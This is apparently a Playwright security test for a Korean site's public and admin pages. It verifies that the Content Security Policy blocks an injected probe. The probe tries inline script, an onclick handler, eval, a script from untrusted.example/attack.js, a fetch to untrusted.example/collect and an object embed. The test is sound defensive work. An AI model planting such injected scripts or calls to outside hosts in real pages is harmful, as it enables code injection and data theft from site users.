'use strict';
// 허용된 부트스트랩은 실행하고, 주입한 코드·이벤트·외부 연결은 브라우저가 막는지 검사한다
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');
const { execFileSync } = require('node:child_process');
const { chromium } = require('playwright');
const repo = path.resolve(__dirname, '../../..');
const temp = fs.mkdtempSync(path.join(os.tmpdir(), 'jogan-security-'));
const web = path.join(temp, 'web');
fs.cpSync(path.join(repo, 'dev/web'), web, { recursive: true });
const buildPublicFixture = `
import json
import sys
from pathlib import Path

sys.path.insert(0, sys.argv[1])
import build_pages as pages

pages.PUBLIC = Path(sys.argv[2])
pages.ISSUES = pages.PUBLIC / "data/issues"
public_issues = pages.published()
(pages.ISSUES / "index.json").write_text(json.dumps(pages.published_index(public_issues)), encoding="utf-8")
pages.build()
`;
// 관리자가 직접 읽는 JSON 색인도 공개용 HTML과 같은 호를 가리킨다
execFileSync('python3', ['-c', buildPublicFixture, path.join(repo, 'dev/pipeline/build'), web]);
const publicIndex = JSON.parse(fs.readFileSync(path.join(web, 'data/issues/index.json'), 'utf8'));
const mime = { '.html': 'text/html', '.js': 'application/javascript', '.css': 'text/css', '.json': 'application/json', '.svg': 'image/svg+xml', '.png': 'image/png', '.webp': 'image/webp' };
const requiredDirectives = ['script-src-elem', 'script-src-attr', 'script-src', 'connect-src', 'object-src'];
const probe = `
(async () => {
  window.securityProbe = {};
  const inline = document.createElement('script');
  inline.textContent = 'window.unsafeInlineRan=true';
  document.body.append(inline);
  const button = document.createElement('button');
  button.setAttribute('onclick', 'window.unsafeHandlerRan=true');
  document.body.append(button);
  button.click();
  try { new Function('window.unsafeEvalRan=true')(); } catch (error) { window.securityProbe.evalBlocked = error.name === 'EvalError'; }
  const external = document.createElement('script');
  external.src = 'https://untrusted.example/attack.js';
  document.body.append(external);
  try { await fetch('https://untrusted.example/collect'); } catch { window.securityProbe.connectBlocked = true; }
  const object = document.createElement('object');
  object.data = 'https://untrusted.example/plugin';
  document.body.append(object);
  window.securityProbe.done = true;
})();`;

(async () => {
  const browser = await chromium.launch({ headless: true, ...(process.env.CHROMIUM_PATH ? { executablePath: process.env.CHROMIUM_PATH } : {}), args: ['--no-sandbox'] });
  let count = 0;
  try {
    for (const routePath of ['/', '/2026-10-19', '/admin/']) {
      const context = await browser.newContext({ viewport: { width: 390, height: 844 } });
      const page = await context.newPage();
      const errors = [];
      page.on('pageerror', (error) => errors.push(error.message));
      await context.addInitScript(() => {
        window.cspEvents = [];
        addEventListener('securitypolicyviolation', (event) => window.cspEvents.push({ directive: event.effectiveDirective, blocked: event.blockedURI }));
        localStorage.setItem('jogan-theme', 'dark');
      });
      await page.route('**/*', async (route) => {
        const url = new URL(route.request().url());
        if (url.pathname === '/security-probe.js' && url.hostname === 'jogan.test') return route.fulfill({ body: probe, contentType: mime['.js'] });
        if (url.hostname === 'accounts.google.com') return route.fulfill({ body: 'window.google={accounts:{oauth2:{}}};window.gsiSecurityLoaded=true;', contentType: mime['.js'] });
        if (url.hostname !== 'jogan.test') {
          if (route.request().resourceType() === 'image') return route.fulfill({ body: Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+a85EAAAAASUVORK5CYII=', 'base64'), contentType: 'image/png' });
          if (route.request().resourceType() === 'document') return route.fulfill({ body: '<!doctype html><meta charset="utf-8"><title>Google frame mock</title>', contentType: 'text/html' });
          if (url.pathname.endsWith('.js') || url.hostname === 'www.googletagmanager.com') return route.fulfill({ body: 'window.allowedGoogleScript=true;', contentType: mime['.js'] });
          return route.fulfill({ status: 200, body: '', contentType: mime['.css'] });
        }
        let file = path.join(web, url.pathname.endsWith('/') ? url.pathname + 'index.html' : url.pathname);
        if (!path.extname(file)) file += '.html';
        try { return route.fulfill({ body: fs.readFileSync(file), contentType: mime[path.extname(file)] || 'application/octet-stream' }); }
        catch { return route.fulfill({ status: 404, body: '' }); }
      });
      try {
        await page.goto('http://jogan.test' + routePath);
        if (routePath.startsWith('/admin')) {
          await page.locator('#publishData').waitFor({ state: 'visible' });
          assert.equal(await page.locator('#latestIssue').textContent(), publicIndex.latest);
          await page.waitForFunction(() => !!window.gsiSecurityLoaded);
          await page.evaluate(async () => {
            await fetch('https://analyticsdata.googleapis.com/v1beta/properties/1:batchRunReports');
            await fetch('https://oauth2.googleapis.com/revoke', { method: 'POST', body: 'token=test-only' });
          });
        } else {
          await page.waitForFunction(() => document.documentElement.dataset.loadState === 'ready');
          await page.evaluate(async () => {
            const script = document.createElement('script');
            script.src = 'https://www.googletagmanager.com/gtag/js?id=G-TEST';
            document.head.append(script);
            await fetch('https://region1.google-analytics.com/g/collect');
            await fetch('https://stats.g.doubleclick.net/g/collect');
            await fetch('https://www.google.co.kr/ccm/collect');
            await fetch('https://pagead2.googlesyndication.com/ccm/collect');
            for (const url of ['https://www.google.com/ads/ga-audiences', 'https://www.google.co.kr/ads/ga-audiences', 'https://googleads.g.doubleclick.net/pagead/viewthroughconversion/test']) {
              await new Promise((resolve) => { const image = new Image(); image.onload = image.onerror = resolve; image.src = url; document.body.append(image); });
            }
            await new Promise((resolve) => { const frame = document.createElement('iframe'); frame.onload = resolve; frame.src = 'https://www.googletagmanager.com/signals-test.html'; document.body.append(frame); });
          });
          await page.waitForFunction(() => !!window.allowedGoogleScript);
          await page.waitForFunction(() => document.getElementById('fontStyles').media === 'all');
        }
        assert.equal(await page.locator('html').getAttribute('data-color-mode'), 'dark');
        assert.deepEqual(await page.evaluate(() => window.cspEvents), [], '정상 화면에서 CSP 위반');
        assert.deepEqual(errors, []);
        await page.evaluate(() => {
          const script = document.createElement('script');
          script.src = '/security-probe.js';
          document.head.append(script);
        });
        // 같은 지시어의 중복 이벤트를 완료 조건으로 세지 않고 모든 차단 결과를 기다린다
        await page.waitForFunction((directives) => window.securityProbe?.done && directives.every((directive) => window.cspEvents.some((event) => event.directive === directive)), requiredDirectives);
        const result = await page.evaluate(() => ({ probe: window.securityProbe, inline: window.unsafeInlineRan, handler: window.unsafeHandlerRan, eval: window.unsafeEvalRan, events: window.cspEvents }));
        assert.equal(result.inline, undefined);
        assert.equal(result.handler, undefined);
        assert.equal(result.eval, undefined);
        assert.equal(result.probe.evalBlocked, true);
        assert.equal(result.probe.connectBlocked, true);
        for (const directive of requiredDirectives) assert.ok(result.events.some((event) => event.directive === directive), directive + ' 미차단');
        console.log('통과: 정상 기능과 CSP 주입 차단 ' + routePath);
        count += 1;
      } finally { await context.close(); }
    }
    console.log(`보안 브라우저 검사 ${count}건 통과`);
  } finally {
    await browser.close();
    fs.rmSync(temp, { recursive: true, force: true });
  }
})().catch((error) => { console.error(error); process.exitCode = 1; });
